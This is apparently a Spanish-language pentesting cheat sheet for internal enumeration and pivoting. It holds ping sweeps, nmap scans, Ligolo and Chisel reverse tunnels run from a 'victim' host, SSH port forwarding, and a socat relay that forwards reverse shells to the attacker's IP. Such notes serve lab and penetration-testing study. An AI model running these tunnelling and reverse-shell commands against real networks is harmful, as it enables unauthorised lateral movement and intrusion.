- [ ] 
## ENUMERACIÓN INTERNA

- Linux
```bash
#Ver host desde dentro
arp
```

```bash
for i in {1..255} ;do (ping -c 1 172.16.1.$i | grep  "bytes from");done
```

- Subes fping y haces:
```bash
./fping -a -g 192.168.100.0/24 2>/dev/null 
```


- Windows
```powershell
(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"
```

# Enumerar

```bash
fping -a -g 192.168.100.0/24 2>/dev/null


nmap -sCV -iL internal2.txt --min-rate 1000 -Pn -T4 -oN internal2_ports
```


## Ligolo

- Descargar el proxy y el agente

```bash
sudo ip tuntap add user $USER mode tun ligolo

sudo ip link set ligolo up

#SEGMENTO DE LA VICTIMA IP=10.10.11.187 -> 10.10.11.0
sudo ip route add segmento_a_llegar/24 dev ligolo
```

- Configurando el `proxy

```bash
./proxy -selfcert
#Tras unirte a la session
interface_create --name ligolo
route_add --name ligolo --route 10.0.2.0/24
tunnel_start --tun ligolo
#En la maquina victima
./agent -connect MIIP:11601 -ignore-cert

 #En el proxy
 session #Seleccionas la primera
 start
 listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
```

# Borrar todo

- Cancelas el agente

```bash
sudo ip route del segmento/24 dev ligolo

sudo ip link del ligolo
```


## SHH ports

```bash
ssh -L 8000:127.0.0.1:8000 enzo@10.10.11.68
```


## Chisel

- En mi linux

```bash
./chisel server -p 33 --reverse
```

- En la victima
```bash
./chisel client MI_IP:33 R:socks

#Un puerto con doble pivoting
./chisel client MI_IP:33 R:7071:localhost:8080
#Acceder al puerto con la MI_IP:7071 
#dentro de ligolo
route_add --name ligolo --route 240.0.0.1/32
```

- Para revshells usamos *SOCAT*, en la maquina victima

```bash
./socat tcp-l:1111,fork,reusaddr tcp:MI_IP:111
```

- Debes añadir:
```bash
/etc/proxychains4.conf -> socks5 127.0.0.1 1080

y el foxy pproxy con el socks5 en 1080 y localhost
```
